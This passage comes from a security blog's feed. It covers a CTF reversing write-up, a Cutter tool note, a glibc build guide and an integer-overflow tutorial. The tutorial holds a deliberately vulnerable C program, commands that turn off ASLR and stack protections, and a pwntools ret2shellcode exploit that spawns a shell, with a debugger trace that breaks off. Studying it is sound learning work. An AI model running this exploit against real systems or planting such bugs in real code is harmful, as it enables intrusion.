punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>Then you can know the <code>data.bin</code> is actually encoded… So how to decode it and get the <code>stage2.bin</code>?</p><p>Obviously, the value of “user.name” is the key…Make sure it is the property of challenge environment，not our computer’s “user.name”…</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//...Ellipsis</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfString<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    String str <span class="token operator">=</span> <span class="token string">"matreha!"</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> <span class="token function">encode</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">18</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    String username <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token function">decode</span><span class="token punctuation">(</span>arrayOfByte2<span class="token punctuation">,</span><span class="token string">"matreha!"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    File localFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileInputStream localFileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>localFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>localFile<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte4 <span class="token operator">=</span> <span class="token function">decode</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span>    FileOutputStream localFileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"stage2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>arrayOfByte4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arrayOfByte4<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//...</span></code></pre><p>Then compile the program and run it…</p><h2 id="Step2-Golang-analysis"><a href="#Step2-Golang-analysis" class="headerlink" title="Step2: Golang analysis"></a>Step2: Golang analysis</h2><p>You have got the <code>stage2.bin</code> from step1.</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722154552.png" alt=""></p><p>According to the combination of static analysis and dynamic analysis, we can know the program logic as follows：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722205942.png" alt=""></p><p>It should be noted that when XOR reaches the last byte, the loop produces some differences, and it is easy to ignore the key of the last byte, but this byte can be inferred……</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722210542.png" alt=""></p><p>Dynamically debugging：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722211126.png" alt=""></p><p>The R8 stores the key byte that we should get…RSI stores our directory string…There is seventeen key bytes totally…After getting all the key bytes, just xor it with the Built-in ciphertext…</p><p><code>Built-in ciphertext(hex)</code>:0x53ddc587e46399144fa4142dc42404c0b0</p><p><code>Key(hex)</code>:0x38afaaf48c08f84b22c5605fa1576cabd1</p><pre class=" language-python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">58</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2sIn <span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">:</span> n2s<span class="token punctuation">(</span><span class="token number">0x53ddc587e46399144fa4142dc42404c0b0</span><span class="token operator">^</span><span class="token number">0x38afaaf48c08f84b22c5605fa1576cabd1</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'kroshka_matreshka'</span></code></pre><p>Then i mv the program in a directory named ‘kroshka_matreshka’ and run it…A result.pyc…well😎</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722211935.png" class="lazyload"></p><p>Apparently，we arrived here：</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722211827.png" class="lazyload"></p><h2 id="Step3：Python-analysis"><a href="#Step3：Python-analysis" class="headerlink" title="Step3：Python analysis"></a>Step3：Python analysis</h2><p>Decompiling <code>result.pyc</code>, then you can see the logic from source code…This is an eight-byte key cycle XOR encryption algorithm.</p><p>You have known the flag is begin with <code>cybrics{</code>，so you can directly get the key：<code>Kr0H4137</code>，then you just get flag by decrypting the ciphertext…🆗</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> result <span class="token keyword">import</span> <span class="token operator">*</span>Enter key to get flag<span class="token punctuation">:</span>Kr0H4137cybrics<span class="token punctuation">{</span>M4TR35HK4_15_B35T<span class="token punctuation">}</span><span class="token operator">>></span><span class="token operator">></span></code></pre><h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p>It’s a nice and full day!😄</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Binary </tag>
            
            <tag> Reverse </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Awesome_Cutter_radare2</title>
      <link href="/2019/07/21/Awesome-Cutter-radare2/"/>
      <url>/2019/07/21/Awesome-Cutter-radare2/</url>
      
        <content type="html"><![CDATA[<p>Cutter is a free and open-source GUI for radare2 reverse engineering framework. Its goal is making an advanced, customizable and FOSS reverse-engineering platform while keeping the user experience at mind. Cutter is created by reverse engineers for reverse engineers😎.</p><a id="more"></a><p>Github repository link: <a href="https://github.com/radareorg/cutter" target="_blank" rel="noopener">https://github.com/radareorg/cutter</a></p><p>Instruction doc link：<a href="https://cutter.re/docs/" target="_blank" rel="noopener">https://cutter.re/docs/</a></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190721170055.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Compile_Glibc_Manually</title>
      <link href="/2019/07/20/Manually-Compile-Glibc/"/>
      <url>/2019/07/20/Manually-Compile-Glibc/</url>
      
        <content type="html"><![CDATA[<p>If you want to learn some fantastic and advance technique about Security, You have to command some fundamental knowledge……</p> <a id="more"></a><h1 id="Compile-Glibc-Manually"><a href="#Compile-Glibc-Manually" class="headerlink" title="Compile_Glibc_Manually"></a>Compile_Glibc_Manually</h1><blockquote><p>Today i will show you how to compile a glibc manually.</p></blockquote><h2 id="What-is-Glibc"><a href="#What-is-Glibc" class="headerlink" title="What is Glibc?"></a>What is Glibc?</h2><p>Refer from the <code>stack overflow</code>:<a href="https://stackoverflow.com/questions/11460782/what-is-glibc-what-is-it-used-for" target="_blank" rel="noopener">https://stackoverflow.com/questions/11460782/what-is-glibc-what-is-it-used-for</a></p><blockquote><p>It’s the implementation of <em>Standard C library</em> described in C standards plus some extra useful stuffs which are not strictly standard but used frequently.</p><p>Its main contents are :</p><p>1) C library described in ANSI,c99,c11 standards. It includes macros, symbols, function implementations etc.(printf(),malloc() etc)</p><p>2) POSIX standard library. The “userland” glue of system calls. (open(),read() etc. Actually glibc does not “implement” system calls. kernel does it. But glibc provides the user land interface to the services provided by kernel so that user application can use a system call just like a ordinary function.</p><p>3) Also some nonstandard but useful stuff.</p><p>“use the force, read the source “</p><pre class=" language-bash"><code class="language-bash"><span class="token variable">$git</span> clone git://sourceware.org/git/glibc.git</code></pre></blockquote><h2 id="What-is-ld-so"><a href="#What-is-ld-so" class="headerlink" title="What is ld.so?"></a>What is ld.so?</h2><p>ld.so : Dynamic linker of system…Used for Executed-file like a.out</p><p>ld-linux.so: Dynamic linker of linux…Used for ELF format Executed-file.</p><pre class=" language-bash"><code class="language-bash"> ✘ ⚡ root@xiaoyifeng ~/glibc_source/glibc2.23_build <span class="token comment" spellcheck="true"># file ./elf/ld-linux-x86-64.so.2</span>./elf/ld-linux-x86-64.so.2: symbolic <span class="token function">link</span> to ld.so</code></pre><h2 id="What-is-libc-so"><a href="#What-is-libc-so" class="headerlink" title="What is libc.so?"></a>What is libc.so?</h2><p>libc.so : Glibc binary is called libc.so.6</p><p>Actually libc.so.6 is a symbolic link to libc.so…… </p><pre class=" language-bash"><code class="language-bash"> ⚡ root@xiaoyifeng  ~/glibc_source/glibc2.23_build <span class="token comment" spellcheck="true"># file libc.so.6</span>libc.so.6: symbolic <span class="token function">link</span> to libc.so</code></pre><p><a href="https://stackoverflow.com/questions/11372872/what-is-the-role-of-libcglibc-in-our-linux-app" target="_blank" rel="noopener">What is libc?</a></p><h2 id="Compiling-it"><a href="#Compiling-it" class="headerlink" title="Compiling it!"></a>Compiling it!</h2><blockquote><p>Reference:<a href="https://www.jianshu.com/p/ee1ad4044ef7" target="_blank" rel="noopener">https://www.jianshu.com/p/ee1ad4044ef7</a></p></blockquote><p>Before compile it，you should download the special glibc source code and uncompressed it……Then you should mkdir two another directory called for build and compiling file……like this:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720155219.png" alt=""></p><h3 id="Step1-configure"><a href="#Step1-configure" class="headerlink" title="Step1:configure"></a>Step1:configure</h3><p>It’s important to add <code>--disable-werror</code>……</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720152708.png" alt=""></p><h3 id="Step2-make"><a href="#Step2-make" class="headerlink" title="Step2: make"></a>Step2: make</h3><p>Maybe you would encounter this bad problem. : <code>can&#39;t be versioned to common symbol &#39;loc1&#39;</code></p><p>Just find the solution in this page : <a href="https://www.e-learn.cn/content/qita/664508" target="_blank" rel="noopener">https://www.e-learn.cn/content/qita/664508</a></p><pre class=" language-c"><code class="language-c"><span class="token operator">--</span><span class="token operator">-</span> a<span class="token operator">/</span>misc<span class="token operator">/</span>regexp<span class="token punctuation">.</span>c<span class="token operator">++</span><span class="token operator">+</span> b<span class="token operator">/</span>misc<span class="token operator">/</span>regexp<span class="token punctuation">.</span>c@@ <span class="token operator">-</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">14</span> <span class="token operator">+</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">15</span> @@ <span class="token macro property">#<span class="token directive keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_23)</span><span class="token operator">-</span><span class="token comment" spellcheck="true">/* Define the variables used for the interface.  */</span><span class="token operator">-</span><span class="token keyword">char</span> <span class="token operator">*</span>loc1<span class="token punctuation">;</span><span class="token operator">-</span><span class="token keyword">char</span> <span class="token operator">*</span>loc2<span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment" spellcheck="true">/* Define the variables used for the interface.  Avoid .symver on common+   symbol, which just creates a new common symbol, not an alias.  */</span><span class="token operator">+</span><span class="token keyword">char</span> <span class="token operator">*</span>loc1 <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>nocommon<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token keyword">char</span> <span class="token operator">*</span>loc2 <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>nocommon<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">compat_symbol</span> <span class="token punctuation">(</span>libc<span class="token punctuation">,</span> loc1<span class="token punctuation">,</span> loc1<span class="token punctuation">,</span> GLIBC_2_0<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">compat_symbol</span> <span class="token punctuation">(</span>libc<span class="token punctuation">,</span> loc2<span class="token punctuation">,</span> loc2<span class="token punctuation">,</span> GLIBC_2_0<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Although we do not support the use we define this variable as well.  */</span><span class="token operator">-</span><span class="token keyword">char</span> <span class="token operator">*</span>locs<span class="token punctuation">;</span><span class="token operator">+</span><span class="token keyword">char</span> <span class="token operator">*</span>locs <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>nocommon<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">compat_symbol</span> <span class="token punctuation">(</span>libc<span class="token punctuation">,</span> locs<span class="token punctuation">,</span> locs<span class="token punctuation">,</span> GLIBC_2_0<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Just add <code>__attribute__ ((nocommon))</code> behind the <code>*loc</code>，then you can solve this error;</p><h3 id="step3-make-install"><a href="#step3-make-install" class="headerlink" title="step3: make install"></a>step3: make install</h3><p>After <code>make install</code>, you can find the libc.so compiled by yourself in build directory, and ld.so is in elf directory.</p><h3 id="Notes"><a href="#Notes" class="headerlink" title="Notes:"></a>Notes:</h3><p>Although the same version of libc may also have diffrent offset because of the diffrent args in compiling time.</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720154352.png" alt=""></p><h2 id="Using-The-Compiled-Glibc-To-Compile-Program"><a href="#Using-The-Compiled-Glibc-To-Compile-Program" class="headerlink" title="Using The Compiled Glibc To Compile Program"></a>Using The Compiled Glibc To Compile Program</h2><p><code>Instructions</code>:</p><pre class=" language-bash"><code class="language-bash">gcc -g -fno-stack-protector -z execstack size_over.c -o size_over -Wl,--rpath<span class="token operator">=</span>/root/glibc_source/glibc2.23_build/ -Wl,--dynamic-linker<span class="token operator">=</span>/root/glibc_source/glibc2.23_build/elf/ld-linux-x86-64.so.2</code></pre><p><code>compile program</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720161136.png" alt=""></p><p><code>libs infomation</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720161116.png" alt=""></p><p><code>Use gdb to debug in underlying source level</code>：</p><p>reference: <a href="https://stackoverflow.com/questions/29955609/include-source-code-of-malloc-c-in-gdb" target="_blank" rel="noopener">https://stackoverflow.com/questions/29955609/include-source-code-of-malloc-c-in-gdb</a></p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720161923.png" class="lazyload"></p><h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p>So cool it is😄!</p>]]></content>
      
      
      <categories>
          
          <category> Binary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Binary </tag>
            
            <tag> Compile </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Integer_Overflow</title>
      <link href="/2019/07/19/Integer-Overflow/"/>
      <url>/2019/07/19/Integer-Overflow/</url>
      
        <content type="html"><![CDATA[<p>Buffer overflow triggered by integer overflow☕……</p><a id="more"></a><p>[TOC]</p><h1 id="Integer-Overflow"><a href="#Integer-Overflow" class="headerlink" title="Integer_Overflow"></a>Integer_Overflow</h1><blockquote><p>I have learned the <code>size_t ==&gt; unsigned char</code> integer overflow🙃…</p></blockquote><h2 id="Example-Source-Code"><a href="#Example-Source-Code" class="headerlink" title="Example Source Code"></a>Example Source Code</h2><p><code>Instructions to compile:</code></p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> 0 <span class="token operator">></span> /proc/sys/kernel/randomize_va_spacegcc -g -fno-stack-protector -z execstack size_over.c -o size_over</code></pre><p><code>size_over.c</code></p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">void</span> <span class="token function">validate_msg</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">,</span><span class="token keyword">int</span> msg_size<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> msg_buf<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">char</span> msg_len <span class="token operator">=</span> msg_size<span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+]msg_len:%d \n"</span><span class="token punctuation">,</span>msg_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>msg_len <span class="token operator">>=</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> msg_len <span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"good!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>msg_buf<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    size_t msg_size<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Input the size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>msg_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> payload<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">,</span>msg_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//printf("%s\n",payload);</span>    <span class="token function">validate_msg</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span>msg_size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Exploit-script"><a href="#Exploit-script" class="headerlink" title="Exploit script"></a>Exploit script</h2><blockquote><p>Here is my exploit script…</p><p>Maybe i should spend some time to learn Underlying libc…</p><p>From this example, we can know more about the way through overflow to execute shellcode in stack and the influence of <code>\x00</code>……</p><p>Normally, execute shellcode in stack should make sure NX disabled…And hijacking program go to stack by using gadget <code>jmp esp</code>,or control Eip while knowing stack address…</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># diffrent enviroment has diffrent address......here is test result of my computer......</span>rbp <span class="token operator">=</span> <span class="token number">0x7fffffffdcb0</span>shellcode_addr <span class="token operator">=</span> <span class="token number">0x7fffffffdcb0</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token comment" spellcheck="true"># padding(12+8) + shellcode_addr(8)  </span>payload <span class="token operator">=</span> <span class="token string">""</span>payload <span class="token operator">+=</span> <span class="token number">12</span> <span class="token operator">*</span> <span class="token string">"a"</span>payload <span class="token operator">+=</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token string">"b"</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token operator">*</span><span class="token string">"\x90"</span>payload <span class="token operator">+=</span> shellcodepayload  <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">260</span><span class="token punctuation">,</span><span class="token string">"\x90"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./size_over'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span><span class="token comment" spellcheck="true">#pause()</span><span class="token comment" spellcheck="true">#p.recvuntil(":")</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'260\n'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><code>Running to ret2shellcode_addr</code>:</p><pre class=" language-python"><code class="language-python">pwndbg<span class="token operator">></span> ni<span class="token number">0x00005555555551dc</span> <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>LEGEND<span class="token punctuation">:</span> STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA──────────────────────────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> REGISTERS <span class="token punctuation">]</span>────────────────────────────────────────────────────────────────────────────────────── RAX  <span class="token number">0x7fffffffdca4</span> ◂— <span class="token number">0x6161616161616161</span> <span class="token punctuation">(</span><span class="token string">'aaaaaaaa'</span><span class="token punctuation">)</span> RBX  <span class="token number">0x0</span> RCX  <span class="token number">0xffffdce062626262</span> RDX  <span class="token number">0x7fffff</span> RDI  <span class="token number">0x7fffffffdcb4</span> ◂— <span class="token number">0xffffdce062626262</span> RSI  <span class="token number">0x7fffffffdcd0</span> ◂— <span class="token number">0xffffdce062626262</span> R8   <span class="token number">0x7ffff7f9e500</span> ◂— add    ch<span class="token punctuation">,</span> ah <span class="token operator">/</span><span class="token operator">*</span> <span class="token number">0x7ffff7f9e500</span> <span class="token operator">*</span><span class="token operator">/</span> R9   <span class="token number">0x7fffffffdb67</span> ◂— <span class="token number">0xa87c57a943ef0034</span> <span class="token operator">/</span><span class="token operator">*</span> <span class="token string">'4'</span> <span class="token operator">*</span><span class="token operator">/</span> R10  <span class="token number">0xfffffffffffff4a8</span> R11  <span class="token number">0x7ffff7f58a60</span> ◂— add    byte ptr <span class="token punctuation">[</span>rdx<span class="token punctuation">]</span><span class="token punctuation">,</span> cl R12  <span class="token number">0x555555555090</span> ◂— xor    ebp<span class="token punctuation">,</span> ebp R13  <span class="token number">0x7fffffffe190</span> ◂— <span class="token number">0x1</span> R14  <span class="token number">0x0</span> R15  <span class="token number">0x0</span> RBP  <span class="token number">0x6262626262626262</span> <span class="token punctuation">(</span><span class="token string">'bbbbbbbb'</span><span class="token punctuation">)</span> RSP  <span class="token number">0x7fffffffdcb8</span> —▸ <span class="token number">0x7fffffffdce0</span> ◂— <span class="token number">0x9090909090909090</span> RIP  <span class="token number">0x5555555551dc</span> ◂— ret    ───────────────────────────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> DISASM <span class="token punctuation">]</span>────────────────────────────────────────────────────────────────────────────────────────   <span class="token number">0x5555555551ce</span>    lea    rdi<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rip <span class="token operator">+</span> <span class="token number">0xe46</span><span class="token punctuation">]</span>   <span class="token number">0x5555555551d5</span>    call   <span class="token number">0x555555555040</span>   <span class="token number">0x5555555551da</span>    nop       <span class="token number">0x5555555551db</span>    leave   ► <span class="token number">0x5555555551dc</span>    ret    <span class="token operator">&lt;</span><span class="token number">0x7fffffffdce0</span><span class="token operator">></span>   <span class="token number">0x5555555551dd</span>    push   rbp   <span class="token number">0x5555555551de</span>    mov    rbp<span class="token punctuation">,</span> rsp   <span class="token number">0x5555555551e1</span>    sub    rsp<span class="token punctuation">,</span> <span class="token number">0x3f0</span>   <span class="token number">0x5555555551e8</span>    lea    rdi<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rip <span class="token operator">+</span> <span class="token number">0xe31</span><span class="token punctuation">]</span>   <span class="token number">0x5555555551ef</span>    mov    eax<span class="token punctuation">,</span> <span class="token number">0</span>   <span class="token number">0x5555555551f4</span>    call   <span class="token number">0x555555555050</span>────────────────────────────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>────────────────────────────────────────────────────────────────────────────────────────<span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0000</span>│ rsp  <span class="token number">0x7fffffffdcb8</span> —▸ <span class="token number">0x7fffffffdce0</span> ◂— <span class="token number">0x9090909090909090</span><span class="token number">01</span><span class="token punctuation">:</span><span class="token number">0008</span>│      <span class="token number">0x7fffffffdcc0</span> ◂— <span class="token number">0x6161616161616161</span> <span class="token punctuation">(</span><span class="token string">'aaaaaaaa'</span><span class="token punctuation">)</span><span class="token number">02</span><span class="token punctuation">:</span><span class="token number">0010</span>│      <span class="token number">0x7fffffffdcc8</span> ◂— <span class="token number">0x6262626261616161</span> <span class="token punctuation">(</span><span class="token string">'aaaabbbb'</span><span class="token punctuation">)</span><span class="token number">03</span><span class="token punctuation">:</span><span class="token number">0018</span>│ rsi  <span class="token number">0x7fffffffdcd0</span> ◂— <span class="token number">0xffffdce062626262</span><span class="token number">04</span><span class="token punctuation">:</span><span class="token number">0020</span>│      <span class="token number">0x7fffffffdcd8</span> ◂— <span class="token number">0x9090909000007fff</span><span class="token number">05</span><span class="token punctuation">:</span><span class="token number">0028</span>│      <span class="token number">0x7fffffffdce0</span> ◂— <span class="token number">0x9090909090909090</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> ↓──────────────────────────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>────────────────────────────────────────────────────────────────────────────────────── ► f <span class="token number">0</span>     <span class="token number">5555555551dc</span>   f <span class="token number">1</span>     <span class="token number">7fffffffdce0</span>   f <span class="token number">2</span> <span class="token number">6161616161616161</span>   f <span class="token number">3</span> <span class="token number">6262626261616161</span>   f <span class="token number">4</span> ffffdce062626262   f <span class="token number">5</span> <span class="token 